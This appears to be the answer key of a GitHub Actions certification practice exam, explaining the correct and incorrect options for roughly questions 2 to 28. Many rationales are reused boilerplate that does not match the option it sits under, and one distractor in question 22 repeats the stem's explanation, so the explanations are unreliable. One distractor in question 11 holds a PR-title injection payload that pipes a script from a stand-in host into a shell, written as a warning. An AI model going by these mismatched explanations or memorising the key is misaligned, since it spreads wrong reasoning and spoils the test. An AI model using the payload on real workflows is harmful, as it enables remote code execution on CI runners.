- **D:** Correct. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).

### Question 3 — `D` (Author and manage workflows)

Correct answer: D (is correct). Using `paths-ignore` skips the workflow whenever ALL changed files in the push/PR match the ignored glob patterns (`and GitHub Actions forbids declaring both paths and paths-ignore simultaneously on the same trigger`). [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.

### Question 4 — `B` (Author and manage workflows)

Correct answer: B (is correct). Placing `concurrency:` at the job level (`deploy-qa`) lets upstream `lint`/`unit` jobs run in parallel across PRs while serializing ONLY `deploy-qa` (`with cancel-in-progress: false queuing at most 1 pending deployment`). [Skill 1.2: Define workflow scope, permissions, event filters, and concurrency controls | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 5 — `B, C` (Author and manage workflows)

Correct answers: B and C (are correct). `workflow_dispatch` supports typed `inputs:` (`choice` dropdowns, `environment` pickers, `boolean` checkboxes, `number`, `string`) accessible via `${{ inputs.<id> }}`, while `on: workflow_call` validates caller `with:` inputs (`string`, `boolean`, `number`) separately from encrypted `secrets:`. [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Correct. `workflow_dispatch` provides rich UI-validated input types (`up to 10 inputs`), while `workflow_call` validates reusable-workflow `inputs` and `secrets`.
- **C:** Correct. `workflow_dispatch` validates manual UI/API triggers (`up to 10 typed inputs`), while `workflow_call` exposes typed reusable workflow interfaces.
- **D:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **E:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **F:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 6 — `A` (Author and manage workflows)

Correct answer: A (is correct). Declaring `on: workflow_call` (`inputs`, `secrets`, `outputs`), writing `$GITHUB_OUTPUT` + job `outputs`, invoking `jobs.<id>.uses` (`@<sha>`) with `with:` & `secrets:`, and reading `needs.<id>.outputs.<key>` wires cross-workflow outputs cleanly. [Skill 1.3: Design workflows using inputs and reusable configuration patterns | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs)]

- **A:** Correct. Reusable workflows map step `$GITHUB_OUTPUT` -> job `outputs` -> `on.workflow_call.outputs`, which caller jobs read via `needs.<id>.outputs`.
- **B:** Incorrect. `workflow_dispatch` cannot be called by `uses:`, `::set-output` is retired, and downstream jobs must `needs:` the reusable workflow job.
- **C:** Incorrect. Reusable workflows must live in `.github/workflows/`, be invoked at `jobs.<id>.uses` (not `steps:`), and map secrets/outputs explicitly.
- **D:** Incorrect. A reusable workflow fails without `on: workflow_call`, `$GITHUB_ENV` never crosses jobs, and passing secrets in `with:` leaks plaintext.

### Question 7 — `B` (Author and manage workflows)

Correct answer: B (is correct). Enabling job-level `continue-on-error: true` on the `cuda-13-preview` matrix leg catches its non-zero failure so the overall workflow run and downstream `needs:` jobs still evaluate as succeeding. [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 8 — `B` (Author and manage workflows)

Correct answer: B (is correct). No — whenever an `if:` condition omits an explicit status check function (`always()`, `success()`, `failure()`, `cancelled()`), GitHub Actions implicitly prepends `success() && (...)`, skipping the step once a prior step fails. [Skill 1.4: Structure jobs, steps, conditional logic, timeouts, and error-handling behavior | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-conditions-to-control-job-execution)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Correct. Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 9 — `C` (Author and manage workflows)

Correct answer: C (is correct). On a job with `needs:`, `if: failure()` evaluates `true` whenever any job in its dependency chain fails (`whereas without failure()/always(), a failed dependency skips downstream jobs automatically`). [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 10 — `A` (Author and manage workflows)

Correct answer: A (is correct). GitHub Actions models `needs:` as a strict Directed Acyclic Graph (`DAG`); circular job dependencies (`A -> B -> A`) are rejected at workflow parse time before any runner job is queued. [Skill 1.5: Manage job dependencies and execution order | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow#defining-prerequisite-jobs)]

- **A:** Correct. Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. The official GitHub Actions VS Code extension validates workflow syntax, autocompletes action `with:` inputs and `vars`/`secrets`, and inspects runs in-editor.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 11 — `B` (Author and manage workflows)

Correct answer: B (is correct). Issuing `::stop-commands::<endtoken>` (`with a random high-entropy token`) disables stdout workflow-command parsing until matching `::<endtoken>::` is printed, preventing untrusted data streams from spoofing `::error::` or `::add-mask::`. [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **B:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 12 — `A, B, F` (Author and manage workflows)

Correct answers: A, B, and F (are correct). Single-file YAML anchors (`&common-env`), aliases (`*common-env`), and merge keys (`<<: *common-env`) deduplicate repeated mappings inside one `.yml` file; appending `key=value` to `$GITHUB_OUTPUT` exports step outputs; and appending directories to `$GITHUB_PATH` updates `PATH` for subsequent steps in the same job. [Skill 1.6: Use workflow commands and environment files to control job execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions)]

- **A:** Correct. GitHub Actions natively parses YAML 1.1/1.2 node anchors (`&`), aliases (`*`), and map merges (`<<:`) within the same workflow file.
- **B:** Correct. YAML anchors (`&`), aliases (`*`), and merge keys (`<<:`) eliminate duplicate boilerplate inside a single workflow file.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **E:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **F:** Correct. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.

### Question 13 — `D` (Author and manage workflows)

Correct answer: D (is correct). Host-runner jobs (`without job container:`) require explicit `ports: ['9000:9000']` (`or dynamic ['9000']` read via `${{ job.services.minio.ports['9000'] }}`) to reach the service container on `localhost`. [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Correct. Service containers spin up sidecar databases/queues with Docker health probes; host steps use mapped `localhost` ports whereas job containers use service labels.

### Question 14 — `A` (Author and manage workflows)

Correct answer: A (is correct). Defining `services.postgres` with `--health-cmd pg_isready`, mapping `ports` (host) or setting job `container:`, waiting for `healthy` status, and connecting to `localhost:5432` or `postgres:5432` prevents flaky startup races. [Skill 1.7: Configure service containers and containerized job environments | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services/about-service-containers)]

- **A:** Correct. Service containers run `--health-cmd` probes and connect via `localhost:<port>` on host runners or `<label>:5432` inside job containers.
- **B:** Incorrect. Service containers require Linux Docker runner hosts and are destroyed automatically when the single job finishes.
- **C:** Incorrect. `services:` is a job-level key (never inside `steps:`), and steps inside a job `container:` dial `postgres:5432` over the Docker bridge.
- **D:** Incorrect. Host-runner steps cannot resolve Docker bridge hostname `postgres` (`use mapped ports + localhost`), and skipping `--health-cmd` causes races.

### Question 15 — `B` (Author and manage workflows)

Correct answer: B (is correct). Referencing `runs-on: ${{ matrix.runner }}` dynamically dispatches each matrix variant to its target x64 (`ubuntu-24.04`) or ARM64 (`ubuntu-24.04-arm`) hosted runner image. [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.

### Question 16 — `E, F` (Author and manage workflows)

Correct answers: E and F (are correct). `exclude:` prunes `{ os: macos-15, node: 20 }` before scheduling so `5` total matrix jobs are created, and `max-parallel: 3` caps simultaneous active matrix jobs from that strategy at `3` (`queuing the remaining 2 until slots free`). [Skill 1.8: Implement matrix strategies to run workflows across multiple configurations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-variations-of-jobs-in-a-workflow)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **E:** Correct. `fail-fast: false` lets all matrix variants finish reporting test results, and explicit image labels prevent unexpected `*-latest` migration breakages.
- **F:** Correct. Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.

### Question 17 — `B` (Author and manage workflows)

Correct answer: B (is correct). In YAML, `&name` defines an anchor on a node and `*name` (`asterisk alias`) dereferences that anchored value later in the same workflow document. [Skill 1.9: Simplify workflow definitions using YAML anchors and aliases within a workflow file | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Correct. GitHub Actions natively parses YAML 1.1/1.2 node anchors (`&`), aliases (`*`), and map merges (`<<:`) within the same workflow file.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 18 — `D` (Author and manage workflows)

Correct answer: D (is correct). `github.workflow_ref` returns the full immutable workflow reference (`<owner>/<repo>/.github/workflows/<file>.yml@refs/...`), whereas `github.workflow` returns only the human-readable workflow `name:` string. [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.

### Question 19 — `A` (Author and manage workflows)

Correct answer: A (is correct). Even when individual release versions (`v2.1.0`) are published as immutable OCI packages in `GHCR`, floating major tag `@v2` intentionally advances to newer `v2.x` releases (`changing executed code without PR review`), whereas `@<40-char-sha>` locks the exact reviewed commit until Dependabot updates it. [Skill 1.10: Reference actions and workflows using appropriate contexts and immutable references | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs)]

- **A:** Correct. Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.
- **B:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 20 — `C` (Author and manage workflows)

Correct answer: C (is correct). Built-in `format('Release {0} by {1}', ...)` interpolates positional format tokens `{0}`, `{1}`, and `toJSON(value)` pretty-prints any Actions context object as valid JSON (`safe inside env: bindings`). [Skill 1.11: Write expressions using built-in functions and conditional operators | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Built-in expression functions enable dynamic JSON matrices (`fromJSON`) and lockfile cache keys (`hashFiles`) without shell-parsing overhead.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 21 — `C` (Author and manage workflows)

Correct answer: C (is correct). From the GitHub Actions VS Code sidebar, authenticated developers can inspect historical/live workflow runs & step logs AND trigger `workflow_dispatch` runs (`supplying typed inputs`) directly from the IDE. [Skill 1.12: Author and validate workflows using IDE extensions and developer tooling | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/quickstart)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Correct. The official GitHub Actions VS Code extension validates workflow syntax, autocompletes action `with:` inputs and `vars`/`secrets`, and inspects runs in-editor.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 22 — `C` (Author and manage workflows)

Correct answer: C (is correct). No — `actions/cache@v4` is an ephemeral performance cache (`10 GB` repo cap, automatic `7-day` idle eviction) and workflow artifacts cap at `90 days` (`or enterprise retention policy`); long-lived customer distributions belong in GitHub Releases (`with Immutable Releases + Attestations`). [Skill 1.13: Configure dependency caching and manage workflow artifacts and retention | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows)]

- **A:** Incorrect. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **B:** Incorrect. Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.
- **C:** Correct. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **D:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `actions/cache@v4` is an ephemeral performance cache (`10 GB` repo cap, automatic `7-day` idle eviction) and workflow artifacts cap at `90 days` (`or enterprise retention policy`); long-lived customer distributions belong in GitHub Releases (`with Immutable Releases + Attestations`).

### Question 23 — `D` (Author and manage workflows)

Correct answer: D (is correct). Because all legs of a `strategy.matrix` share one `job_id` output slot, whichever matrix leg finishes writing last overwrites `needs.shard-test.outputs.summary`; per-leg results across a matrix should be uploaded as uniquely named `v4` artifacts (`shard-${{ matrix.id }}`) instead. [Skill 1.14: Pass data between steps and jobs using outputs, environment variables, and artifacts | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/passing-information-between-jobs)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Correct. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.

### Question 24 — `C` (Author and manage workflows)

Correct answer: C (is correct). Workflow status badges on `Private` (`and Internal`) repositories enforce repository read authentication, rendering only for signed-in GitHub users who have at least `Read` access to `vireobio/clinical-core` (`unlike Public repo badges, which are world-readable`). [Skill 1.15: Publish job summaries and configure workflow status badges | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions#adding-a-job-summary)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Appending Markdown to `$GITHUB_STEP_SUMMARY` renders rich test/coverage reports on the workflow run summary page.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 25 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Commit-message skip directives (`[skip ci]`, `[ci skip]`, `[no ci]`, `[skip actions]`, or `skip-checks: true` trailer) skip `push` and `pull_request` triggered runs, whereas `workflow_dispatch`, `schedule`, and `repository_dispatch` runs still execute normally. [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **D:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).

### Question 26 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). On `pull_request` (`and pull_request_target`) events, `branches` and `branches-ignore` evaluate exclusively against the PR's BASE (`target`) branch (`main`), NOT the source/head branch (`experimental/simd`). [Skill 2.1: Predict workflow behavior based on event payloads, triggers, and configuration | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.

### Question 27 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). GitHub Actions invokes default `shell: bash` with `bash --noprofile --norc -eo pipefail {0}` (`failing immediately on non-zero pipeline commands`), whereas custom `shell:` templates omit `-eo pipefail` unless you include them explicitly. [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 28 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Messages logged via `core.debug('...')` (`or workflow command ::debug::...`) stay hidden during normal runs and appear in step logs ONLY when `ACTIONS_STEP_DEBUG` is `true` (`checked via core.isDebug()`). [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
